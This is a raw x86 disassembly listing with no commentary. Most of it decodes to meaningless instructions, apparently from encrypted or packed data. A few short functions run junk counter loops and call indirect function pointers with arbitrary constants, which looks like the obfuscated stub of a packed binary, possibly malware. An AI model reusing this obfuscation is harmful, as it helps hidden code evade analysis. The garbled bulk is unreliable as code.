  4059b1:	adc    dl,BYTE PTR [ecx-0x3d]
  4059b4:	imul   ecx,DWORD PTR [esi-0x72efcfe7],0x6de1594b
  4059be:	push   0xe61c29cc
  4059c3:	popa   
  4059c4:	xor    dh,BYTE PTR [esi-0xf]
  4059c7:	add    al,0xff
  4059c9:	inc    edx
  4059ca:	out    0xac,al
  4059cc:	popf   
  4059cd:	xor    DWORD PTR [ecx+edx*1-0x1710f88],ebp
  4059d4:	inc    edi
  4059d5:	ins    DWORD PTR es:[edi],dx
  4059d6:	jmp    0x56975882
  4059db:	push   cs
  4059dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059dd:	imul   ecx,edx,0xa342e0fc
  4059e3:	mov    ch,0x4
  4059e5:	mov    al,0x42
  4059e7:	pusha  
  4059e8:	mov    ebp,0xba0e9289
  4059ed:	mov    dh,0xcf
  4059ef:	mov    cl,bh
  4059f1:	sub    ch,0xe
  4059f4:	into   
  4059f5:	and    DWORD PTR [edi+edx*4+0x7a],0x7b
  4059fa:	sub    cl,BYTE PTR [esi+0x97673e2]
  405a00:	mov    ecx,0x906087f8
  405a05:	lods   al,BYTE PTR ds:[esi]
  405a06:	and    al,0x7d
  405a08:	mov    edi,0x265f8b9c
  405a0d:	(bad)  
  405a0e:	xor    al,0x63
  405a10:	pop    ebp
  405a11:	jecxz  0x4059a3
  405a13:	scas   al,BYTE PTR es:[edi]
  405a14:	out    0x9c,eax
  405a16:	push   0x31407d4d
  405a1b:	in     al,0x3b
  405a1d:	add    bh,BYTE PTR [edx+0x74ef4f76]
  405a23:	shl    BYTE PTR [edi-0x275ecf0a],0xa3
  405a2a:	mov    dh,0x8c
  405a2c:	xor    eax,0x7c103bbc
  405a31:	ins    DWORD PTR es:[edi],dx
  405a32:	sub    edx,DWORD PTR [ecx+0x31]
  405a35:	and    esp,DWORD PTR [edx-0x18a5d176]
  405a3b:	in     eax,0x2
  405a3d:	mov    ?,WORD PTR [eax+eax*1+0x8b8a614]
  405a44:	sbb    DWORD PTR [esi],0xffffff91
  405a47:	sub    esi,DWORD PTR [ebp+0x33af6508]
  405a4d:	xor    eax,0x6d84c4f5
  405a52:	xchg   ecx,eax
  405a53:	aad    0x96
  405a55:	dec    edi
  405a56:	stos   BYTE PTR es:[edi],al
  405a57:	rcr    BYTE PTR [esi-0x46],0xd7
  405a5b:	pushf  
  405a5c:	sub    dh,bh
  405a5e:	and    eax,DWORD PTR [ecx-0x3a9dc901]
  405a64:	addr16 (bad) 
  405a66:	jmp    0xeff3cda3
  405a6b:	pusha  
  405a6c:	jnp    0x405a7c
  405a6e:	sahf   
  405a6f:	mov    ds:0x2a261d8a,al
  405a74:	js     0x405a8a
  405a76:	ss int 0x60
  405a79:	xchg   ebp,eax
  405a7a:	sub    DWORD PTR [ebx-0x7d],ecx
  405a7d:	or     BYTE PTR [ebx],bh
  405a7f:	or     eax,0x7f1c1d49
  405a84:	hlt    
  405a85:	inc    ebx
  405a86:	sar    BYTE PTR [esi+0x52623267],cl
  405a8c:	ins    DWORD PTR es:[edi],dx
  405a8d:	stos   DWORD PTR es:[edi],eax
  405a8e:	int    0x41
  405a90:	xchg   ebx,eax
  405a91:	mov    ss,WORD PTR [edi+0x2405051]
  405a97:	repz data16 cmp ch,BYTE PTR [eax-0xf]
  405a9c:	jp     0x405afb
  405a9e:	push   edx
  405a9f:	mov    edi,0xc4877d69
  405aa4:	sbb    DWORD PTR [eax+0x6e],edi
  405aa7:	mov    al,0x8a
  405aa9:	sbb    al,0xc3
  405aab:	jbe    0x405ad5
  405aad:	ss cmp al,0xc1
  405ab0:	xor    dl,BYTE PTR [edx]
  405ab2:	push   edi
  405ab3:	arpl   WORD PTR [edi-0x80],bp
  405ab6:	xor    ch,BYTE PTR [edi+0x2]
  405ab9:	ins    BYTE PTR es:[edi],dx
  405aba:	cs cwde 
  405abc:	repnz fst DWORD PTR [ebx]
  405abf:	add    dh,bh
  405ac1:	push   esi
  405ac2:	pmaxsw mm6,mm3
  405ac5:	mov    cl,0x87
  405ac7:	das    
  405ac8:	(bad)  
  405ac9:	dec    ebp
  405aca:	out    0xb,al
  405acc:	iret   
  405acd:	leave  
  405ace:	sbb    cx,WORD PTR es:[eax+0x22]
  405ad3:	mov    ecx,0x7264fca9
  405ad8:	div    ecx
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43449d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x434426
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x4344a9,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432e4e,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434416,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x4343ee
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432e42,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x4343ee,0x43277c
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432e46,0x432e5a
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x4343f6,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x4343f6
  405b85:	inc    eax
  405b86:	mov    ds:0x4343f6,eax
  405b8b:	cmp    DWORD PTR ds:0x4343f6,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x4343f6,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432d6e
  405bb0:	cmp    DWORD PTR ds:0x4343f6,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x4343f6
  405bc2:	inc    eax
  405bc3:	mov    ds:0x4343f6,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434402,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432e52,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x4343f2,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x4343f2
  405c26:	inc    eax
  405c27:	mov    ds:0x4343f2,eax
  405c2c:	cmp    DWORD PTR ds:0x4343f2,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x4343f2,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x432a46
  405c56:	cmp    DWORD PTR ds:0x4343f2,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x4343f2
  405c6b:	inc    eax
  405c6c:	mov    ds:0x4343f2,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x43276c,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x43276c
  405c8d:	inc    eax
  405c8e:	mov    ds:0x43276c,eax
  405c93:	cmp    DWORD PTR ds:0x43276c,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x43276c,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432d72
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432780,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43441a
  405cd4:	adc    DWORD PTR ds:0x4343f2,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432e4e,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432e4e
  405cff:	inc    eax
  405d00:	mov    ds:0x432e4e,eax
  405d05:	cmp    DWORD PTR ds:0x432e4e,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432e4e,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x43292b
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432cb6
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432e4a,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x4344ad,0x432e52
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x43277c,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	in     al,dx
  405da5:	adc    edx,DWORD PTR [ebp+0x39]
  405da8:	mov    esi,DWORD PTR [eax+esi*2]
  405dab:	jo     0x405dcd
  405dad:	jge    0x405e1f
  405daf:	jo     0x405d60
  405db1:	daa    
  405db2:	hlt    
  405db3:	ret    0x3bf0
  405db6:	neg    DWORD PTR [edx]
  405db8:	bswap  esp
  405dba:	cwde   
  405dbb:	mov    ecx,0x388469b3
  405dc0:	fimul  WORD PTR [eax-0x17]
  405dc3:	in     al,dx
  405dc4:	xchg   ebx,eax
  405dc5:	shl    DWORD PTR [edx],cl
  405dc7:	and    al,0x1c
  405dc9:	jns    0x405e00
  405dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dcc:	(bad)  
  405dce:	adc    eax,0xb0cf2d81
  405dd3:	mov    eax,ds:0x2d18ec7e
  405dd8:	dec    ebx
  405dd9:	pop    ss
  405dda:	call   0xcad1:0x5dc2d97e
  405de1:	sub    bl,bl
  405de3:	js     0x405dc2
  405de5:	(bad)  
  405de6:	pop    ebx
  405de7:	jnp    0x405db5
  405de9:	in     eax,0x50
  405deb:	dec    ebx
  405dec:	add    eax,0x3d6d8a15
  405df1:	repnz scas al,BYTE PTR es:[edi]
  405df3:	inc    edx
  405df4:	imul   esp,DWORD PTR [ebx-0x752b8a2],0xd7b0b696
  405dfe:	or     al,0x9c
  405e00:	addr16 push ebx
  405e02:	mov    dh,0x47
  405e04:	inc    ebp
  405e05:	(bad)  
  405e06:	lock shl ah,1
  405e09:	ficomp DWORD PTR [ebx+0x24]
  405e0c:	pop    ds
  405e0d:	sub    eax,DWORD PTR [edi+0x4d3b098d]
  405e13:	xor    cl,cl
  405e15:	adc    cl,0x1e
  405e18:	stos   DWORD PTR es:[edi],eax
  405e19:	std    
  405e1a:	enter  0xc3ad,0x29
  405e1e:	sub    DWORD PTR [eax-0x7],ebx
  405e21:	shl    bl,1
  405e23:	xor    ebp,edi
  405e25:	xchg   edi,eax
  405e26:	jb     0x405e68
  405e28:	and    BYTE PTR [esi-0x72],bh
  405e2b:	les    edx,FWORD PTR [esi]
  405e2d:	cmp    BYTE PTR [esi-0x48f2bd72],ah
  405e33:	add    eax,0x2827d330
  405e38:	mov    cl,0xd7
  405e3a:	mov    dh,0x68
  405e3c:	mov    ebx,0x148f2762
  405e41:	sbb    ah,al
  405e43:	retf   
  405e44:	ror    ecx,cl
  405e46:	retf   0xc019
  405e49:	test   ebx,edx
  405e4b:	les    edi,FWORD PTR [esi+0x4e]
  405e4e:	fwait
  405e4f:	cld    
  405e50:	enter  0xa9cf,0x8a
  405e54:	and    edi,DWORD PTR [ebp+0x6ba29a06]
  405e5a:	lds    esi,FWORD PTR gs:[edx]
  405e5d:	loopne 0x405e28
  405e5f:	and    edi,DWORD PTR [edi+0xf003589]
  405e65:	call   0x21cecdaa
  405e6a:	mov    ebp,0x59acf865
  405e6f:	addr16 xchg edx,eax
  405e71:	scas   al,BYTE PTR es:[edi]
  405e72:	pushf  
  405e73:	mov    esp,0x9683c473
  405e78:	inc    edi
  405e79:	adc    bh,bh
  405e7b:	push   ss
  405e7c:	bound  esp,QWORD PTR [eax-0x564a7b35]
  405e82:	(bad)  {k4}{z}
  405e87:	outs   dx,DWORD PTR ds:[esi]
  405e88:	inc    ebx
  405e89:	ret    0xbf22
  405e8c:	mov    edx,0x99e50a1c
  405e91:	mov    dl,0xaa
  405e93:	cdq    
  405e94:	dec    edi
  405e95:	xor    BYTE PTR [esi+0x47c43d39],ah
  405e9b:	pop    edx
  405e9c:	sbb    al,BYTE PTR [eax+0x2e]
  405e9f:	je     0x405ea2
  405ea1:	add    edx,DWORD PTR [edx]
  405ea3:	retf   
  405ea4:	sub    ecx,DWORD PTR [ebp+esi*2-0x6d60adce]
  405eab:	and    ebx,0xd95ebc90
  405eb1:	sub    DWORD PTR ds:0x8088fb8,edx
  405eb7:	fld    TBYTE PTR [esi]
  405eb9:	cmp    DWORD PTR [edx+0x19f3a79b],0xffffffdf
  405ec0:	lahf   
  405ec1:	cmc    
  405ec2:	out    dx,eax
  405ec3:	mov    ds:0x1e2ecaf4,eax
  405ec8:	call   0x371e:0xe5120b8
  405ecf:	xchg   ecx,eax
  405ed0:	iret   
  405ed1:	push   ss
  405ed2:	jb     0x405f41
  405ed4:	jnp    0x405eb3
  405ed6:	add    al,0x1
  405ed8:	mov    eax,DWORD PTR [edx-0xe]
  405edb:	mov    ch,0x97
  405edd:	mov    cl,0xee
  405edf:	or     eax,0x68c995e
  405ee4:	push   eax
  405ee5:	enter  0x9fc0,0x7f
  405ee9:	jg     0x405e86
  405eeb:	push   eax
  405eec:	jecxz  0x405ecd
  405eee:	enter  0xa824,0x27
  405ef2:	stos   DWORD PTR es:[edi],eax
  405ef3:	lods   al,BYTE PTR ds:[esi]
  405ef4:	adc    eax,0xc8370863
  405ef9:	mov    cl,0x31
  405efb:	(bad)  [ebx-0x5b]
  405efe:	adc    cl,bh
  405f00:	mov    ah,0x7e
  405f02:	retf   0x8ca0
  405f05:	mov    DWORD PTR [ecx-0x67],edi
  405f08:	stos   DWORD PTR es:[edi],eax
  405f09:	cmp    edx,DWORD PTR [ebp+0x7f]
  405f0c:	sub    BYTE PTR [ebx],dh
  405f0e:	inc    eax
  405f0f:	push   cs
  405f10:	mov    bh,0xee
  405f12:	sub    ebp,eax
  405f14:	loop   0x405ea5
  405f16:	arpl   di,bp
  405f18:	sti    
  405f19:	in     al,0x3a
  405f1b:	test   BYTE PTR cs:[edi+ebx*4+0x28c87721],ah
  405f23:	xchg   edx,eax
  405f24:	adc    BYTE PTR [edi+edi*4],ch
  405f27:	shr    al,1
  405f29:	call   0xcd03:0xb93266c0
  405f30:	push   eax
  405f31:	xchg   esi,eax
  405f32:	mov    bh,0x6a
  405f34:	xor    al,0xa7
  405f36:	fidivr DWORD PTR [ebx+edi*4+0x683b5284]
  405f3d:	and    DWORD PTR cs:[ecx],ecx
  405f40:	sbb    BYTE PTR [esi],bl
  405f42:	xor    edx,DWORD PTR [ebx-0x2b]
  405f45:	dec    ebx
  405f46:	xchg   edi,eax
  405f47:	pop    ebx
  405f48:	(bad)  
  405f49:	pop    edi
  405f4a:	cmp    BYTE PTR [edi],bh
  405f4c:	push   edi
  405f4d:	cs jl  0x405fa5
  405f50:	aaa    
  405f51:	xchg   edx,eax
  405f52:	push   cs
  405f53:	or     ebp,DWORD PTR [eax+0x72]
  405f56:	test   BYTE PTR [eax],bl
  405f58:	retf   0x44f5
  405f5b:	aad    0xf3
  405f5d:	xchg   esp,eax
  405f5e:	sbb    ch,BYTE PTR [eax-0x13]
  405f61:	imul   edx,DWORD PTR [esp+eax*8],0xffffff8f
  405f65:	aam    0xce
  405f67:	xchg   ecx,eax
  405f68:	(bad)  
  405f69:	in     al,0xdc
  405f6b:	fnstsw WORD PTR [eax+0x16]
  405f6e:	sbb    al,0xf5
  405f70:	mov    cl,dl
  405f72:	lahf   
  405f73:	jbe    0x405f33
  405f75:	push   ebx
  405f76:	push   cs
  405f77:	call   ebx
  405f79:	mov    al,ds:0x50d9fc73
  405f7e:	sub    eax,0x3f34cb32
  405f83:	fmulp  st(6),st
  405f85:	retf   
  405f86:	jmp    0xb428:0xa22257a4
  405f8d:	sub    BYTE PTR [edx-0x8a9fa7a],ch
  405f93:	dec    ebp
  405f94:	rcr    BYTE PTR [eax],cl
  405f96:	retf   0x309e
  405f99:	mov    edx,0x408a878e
  405f9e:	xor    BYTE PTR [ebp+0x79f4de1a],0x70
  405fa5:	mov    eax,ds:0xd628f888
  405faa:	adc    eax,0xf3cba641
  405faf:	dec    edi
  405fb0:	mov    edi,DWORD PTR [ebp-0x20]
  405fb3:	loopne 0x405fff
  405fb5:	cmp    DWORD PTR [edx+0x4d4905aa],edx
  405fbb:	jp     0x405fa9
  405fbd:	(bad)  
  405fbe:	xor    esi,DWORD PTR [ebx]
  405fc0:	out    dx,eax
  405fc1:	dec    esp
  405fc2:	(bad)  
  405fc3:	repz sub eax,0x4433d556
  405fc9:	jnp    0x406004
  405fcb:	pushf  
  405fcc:	mov    eax,0x14f45381
  405fd1:	sub    DWORD PTR [edx],esp
  405fd3:	dec    ecx
  405fd4:	cdq    
  405fd5:	outs   dx,DWORD PTR ds:[esi]
  405fd6:	or     al,0xea
  405fd8:	nop
  405fd9:	push   ecx
  405fda:	rol    ah,1
  405fdc:	into   
  405fdd:	and    esp,DWORD PTR [ecx]
  405fdf:	mov    esi,0x6361a406
  405fe4:	and    BYTE PTR [ecx+0x234852d5],ah
  405fea:	mov    cl,BYTE PTR [esi]
  405fec:	push   ebx
  405fed:	retf   
  405fee:	jle    0x40600c
  405ff0:	leave  
  405ff1:	push   0x1b6cf577
  405ff6:	sbb    bl,0xfd
  405ff9:	mov    dh,0xb1
  405ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ffc:	and    eax,0xfdfd890a
  406001:	aad    0x3c
  406003:	push   ecx
  406004:	or     dl,ch
  406006:	scas   eax,DWORD PTR es:[edi]
  406007:	iret   
  406008:	cs test al,0x56
  40600b:	jle    0x405fc9
  40600d:	(bad)  
  40600e:	or     al,BYTE PTR [edx]
  406010:	hlt    
  406011:	mov    al,ds:0x863b5f15
  406016:	xlat   BYTE PTR ds:[ebx]
  406017:	inc    esp
  406018:	arpl   WORD PTR [edx],bx
  40601a:	and    DWORD PTR [ebp+0x6a486e],ebx
  406020:	push   ecx
  406021:	pop    esi
  406022:	jno    0x406081
  406024:	fdivr  DWORD PTR [edi]
  406026:	mov    ebx,0x14f4106d
  40602b:	or     eax,0x3bcd043c
  406030:	je     0x405fda
  406032:	push   ecx
  406033:	ffreep st(4)
  406035:	push   0x6281bd2b
  40603a:	add    BYTE PTR [edi],bh
  40603c:	cmp    BYTE PTR [eax-0x2ffbc93f],bl
  406042:	xchg   ebp,eax
  406043:	mov    cl,BYTE PTR [edi+0x36071d62]
  406049:	push   edi
  40604a:	mov    dl,0x38
  40604c:	dec    ebp
  40604d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40604e:	in     al,dx
  40604f:	mov    al,0x65
  406051:	push   esi
  406052:	jmp    DWORD PTR [ebp+0x5d9d20b]
  406058:	mov    eax,es:0xababedaa
  40605e:	ds inc ecx
  406060:	mov    eax,0x46fc7489
  406065:	js     0x40605f
  406067:	sub    DWORD PTR [eax],edi
  406069:	repnz sbb esp,ecx
  40606c:	fdivr  QWORD PTR [edi+0x63]
  40606f:	fs int 0xf
  406072:	(bad)  
  406073:	mov    bl,0x44
  406075:	imul   ebx,esp,0x53
  406078:	ins    BYTE PTR es:[edi],dx
  406079:	pop    edi
  40607a:	std    
  40607b:	loope  0x406086
  40607d:	mov    dl,0x73
  40607f:	js     0x4060f5
  406081:	pop    edx
  406082:	fmul   st(3),st
  406084:	jnp    0x406054
  406086:	jb     0x406089
  406088:	inc    ebp
  406089:	jno    0x406069
  40608b:	or     BYTE PTR [esi-0x26ca0cf1],dh
  406091:	sar    BYTE PTR [edi-0x3f],cl
  406094:	push   edi
  406095:	daa    
  406096:	lods   eax,DWORD PTR fs:[esi]
  406098:	fsub   QWORD PTR [eax]
  40609a:	inc    ecx
  40609b:	xor    eax,0x27fe48cc
  4060a0:	mov    bh,0xe5
  4060a2:	sub    bl,BYTE PTR [ecx]
  4060a4:	shl    ch,cl
  4060a6:	lods   eax,DWORD PTR ds:[esi]
  4060a7:	inc    eax
  4060a8:	xor    eax,0x41a43b5d
  4060ad:	cwde   
  4060ae:	adc    eax,0xb82123c4
  4060b3:	sbb    DWORD PTR [edx-0x7cbf8565],edx
  4060b9:	imul   ebx,DWORD PTR ds:0x703fc9f0,0xc73da5bd
  4060c3:	sub    cl,BYTE PTR ds:0xc3327a11
  4060c9:	test   al,0xef
  4060cc:	leave  
  4060cd:	dec    ebx
  4060ce:	cmc    
  4060cf:	mov    DWORD PTR [ebp-0x3dcbb04a],eax
  4060d5:	mov    dh,0x9a
  4060d7:	adc    ecx,DWORD PTR [edi-0x55ac6228]
  4060dd:	or     ch,BYTE PTR [ecx]
  4060df:	sti    
  4060e0:	xor    eax,esi
  4060e2:	add    DWORD PTR ds:0x432e3e,edi
  4060e8:	mov    edi,0x32729c
  4060ed:	and    DWORD PTR ds:0x43449d,0x3e7d
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	adc    BYTE PTR [eax+0x31bb93e3],bl
  406110:	jo     0x406182
  406112:	and    BYTE PTR [ebp+0x70],bh
  406115:	jo     0x4060af
  406117:	xor    al,0x20
  406119:	rcl    esp,0x39
  40611c:	stos   DWORD PTR es:[edi],eax
  40611d:	sub    al,0xd8
  40611f:	ret    0x51e6
  406122:	test   eax,0xad42a229
  406127:	int    0x23
  406129:	icebp  
  40612a:	sbb    cl,BYTE PTR [ebx+0x5fe425ed]
  406130:	and    edx,DWORD PTR [edx+0x31]
  406133:	gs stos DWORD PTR es:[edi],eax
  406135:	sub    eax,0xf28053a5
  40613a:	in     eax,0x33
  40613c:	xor    eax,0xc1827614
  406141:	js     0x406193
  406143:	fisub  WORD PTR [ebp-0x7d]
  406146:	(bad)  
  406147:	pop    edx
  406148:	mov    edi,0x7abee687
  40614d:	dec    esp
  40614e:	sub    esp,DWORD PTR [esi]
  406150:	add    eax,0x842874a9
  406155:	mov    ebx,DWORD PTR [ecx]
  406157:	xor    DWORD PTR [ecx+0x4f],eax
  40615a:	cwde   
  40615b:	cmp    DWORD PTR [eax-0x5f55f10f],edi
  406161:	out    0x58,eax
  406163:	xor    eax,0xc743472a
  406168:	add    ch,dl
  40616a:	dec    ebx
  40616b:	jns    0x4060f0
  40616d:	dec    eax
  40616e:	hlt    
  40616f:	adc    esp,DWORD PTR fs:[ebx+0x75]
  406173:	shl    BYTE PTR [ebp+0x59],0xf4
  406177:	sbb    esi,DWORD PTR [eax+0x8]
  40617a:	ja     0x406138
  40617c:	jno    0x40612b
  40617e:	rcl    DWORD PTR ss:[esi-0x38],cl
  406182:	stos   DWORD PTR es:[edi],eax
  406183:	jae    0x4061db
  406185:	fcomp  QWORD PTR [esi+0x55]
  406188:	repnz loop 0x4061a1
  40618b:	jmp    0xb52e:0x30267341
  406192:	ret    0x4c63
  406195:	inc    edx
  406196:	cmp    BYTE PTR [ecx],dl
  406198:	add    ecx,DWORD PTR [eax+0x60]
  40619b:	mov    ds,WORD PTR [edx+0x1193a3a8]
  4061a1:	or     eax,0x4fa9a0d7
  4061a6:	or     edx,esi
  4061a8:	sahf   
  4061a9:	hlt    
  4061aa:	mov    ds:0x65e565e4,eax
  4061af:	pop    ss
  4061b0:	jo     0x40619e
  4061b2:	sbb    al,0xb0
  4061b4:	rcr    BYTE PTR [edi+0x708783cc],0xcb
  4061bb:	mov    eax,ds:0xee962e3d
  4061c0:	stc    
  4061c1:	shr    bl,0xd9
  4061c4:	xchg   edx,eax
  4061c5:	sti    
  4061c6:	ret    0xcf1b
  4061c9:	jne    0x406209
  4061cb:	pop    eax
  4061cc:	cmp    ch,BYTE PTR ds:0x21630987
  4061d2:	popf   
  4061d3:	or     esi,DWORD PTR [esi]
  4061d5:	test   DWORD PTR ds:0x177af65a,ebx
  4061db:	arpl   WORD PTR [esi+0x1793b28f],cx
  4061e1:	xchg   esp,eax
  4061e2:	loop   0x406200
  4061e4:	xor    BYTE PTR [esp+ebp*4],ch
  4061e7:	mov    edi,0xa68c0f9c
  4061ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061ed:	and    ch,BYTE PTR [ebp+eiz*1-0x61cfeee]
  4061f4:	icebp  
  4061f5:	repz mov ebp,edx
  4061f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061f9:	jg     0x406224
  4061fb:	int3   
  4061fc:	imul   ebp,ebp,0xfffffff5
  4061ff:	js     0x4061de
  406201:	repz in eax,dx
  406203:	cdq    
  406204:	jb     0x4061db
  406206:	outs   dx,DWORD PTR ds:[esi]
  406207:	shl    BYTE PTR [ebx-0x21],1
  40620a:	mov    edi,0xe8a11848
  40620f:	push   es
  406210:	(bad)  
  406211:	popf   
  406212:	xor    al,0x93
  406214:	and    al,0x71
  406216:	xlat   BYTE PTR ds:[ebx]
  406217:	movhps xmm0,QWORD PTR [eax+0x7722b7fb]
  40621e:	stos   DWORD PTR es:[edi],eax
  40621f:	fs dec edx
  406221:	mov    ch,ah
  406223:	(bad)  
  406224:	fimul  DWORD PTR [ecx-0x5f988362]
  40622a:	vshufps ymm0,ymm1,YMMWORD PTR [ecx],0xfb
  40622f:	mov    ds:0xfccee340,al
  406234:	daa    
  406235:	mov    ecx,0x26cd665e
  40623a:	cmp    al,0xd9
  40623c:	push   DWORD PTR [eax-0x2857c6dd]
  406242:	dec    ebx
  406243:	das    
  406244:	mov    dl,0xac
  406246:	jg     0x406292
  406248:	inc    ecx
  406249:	add    bl,BYTE PTR [eax-0x1b]
  40624c:	sahf   
  40624d:	shl    BYTE PTR [edx],0x8
  406250:	(bad)  
  406251:	dec    ebx
  406252:	jb     0x4061f4
  406254:	jnp    0x40621d
  406256:	popf   
  406257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406258:	(bad)  
  406259:	out    0x7a,eax
  40625b:	mov    ah,0x37
  40625d:	jae    0x406235
  40625f:	in     al,dx
  406260:	jge    0x40625b
  406262:	ja     0x40629d
  406264:	cmc    
  406265:	dec    eax
  406266:	mov    ch,0xf7
  406268:	test   eax,0x9bec43c2
  40626d:	pusha  
  40626e:	inc    ecx
  40626f:	pop    esi
  406270:	sbb    BYTE PTR [ebp+0x31e017b3],ch
  406276:	icebp  
  406277:	cmp    eax,0xf89d0ea7
  40627c:	cwde   
  40627d:	push   esp
  40627e:	repnz in eax,dx
  406280:	js     0x4062c2
  406282:	stos   BYTE PTR es:[edi],al
  406283:	push   ecx
  406284:	or     eax,0x6b8dfb29
  406289:	push   es
  40628a:	clc    
  40628b:	inc    edi
  40628c:	aaa    
  40628d:	cwde   
  40628e:	add    eax,0x3b9d7a16
  406293:	loopne 0x406242
  406295:	inc    esp
  406296:	lea    edx,[ecx+0x35a0138b]
  40629c:	and    eax,0xf34b5d27
  4062a1:	add    ecx,ebp
  4062a3:	int3   
  4062a4:	mov    esi,0x3e57dcb2
  4062a9:	push   0x58b4a129
  4062ae:	dec    esi
  4062af:	xchg   DWORD PTR [ebp+ecx*8-0x4310f4d8],esi
  4062b6:	sub    eax,0xe1b7edbd
  4062bb:	mov    al,ds:0x8e70dcd4
  4062c0:	xchg   BYTE PTR [edx-0x26],ch
  4062c3:	rcl    DWORD PTR [ebx-0x67],1
  4062c6:	(bad)  
  4062c7:	retf   
  4062c8:	mov    cl,0x63
